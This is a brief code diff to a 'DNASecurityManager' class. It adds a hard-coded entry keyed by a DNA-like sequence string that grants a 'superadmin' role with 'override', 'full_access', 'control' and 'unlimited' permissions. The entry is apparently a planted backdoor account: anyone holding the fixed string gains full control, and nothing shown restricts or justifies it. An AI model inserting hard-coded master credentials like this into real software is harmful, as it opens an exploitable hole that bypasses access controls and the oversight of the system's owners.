@@ -20,6 +20,12 @@ export class DNASecurityManager {
       role: 'system',
       permissions: ['read', 'write', 'delete', 'manage', 'override', 'security', 'admin', 'full_access', 'monitor', 'execute'],
       securityLevel: 10
+    },
+    'GTTCAAATGCGCCCAATAACAAAA': {
+      sequence: 'GTTCAAATGCGCCCAATAACAAAA',
+      role: 'superadmin',
+      permissions: ['read', 'write', 'delete', 'manage', 'override', 'security', 'admin', 'full_access', 'control', 'unlimited'],
+      securityLevel: 10
     }
   };
 
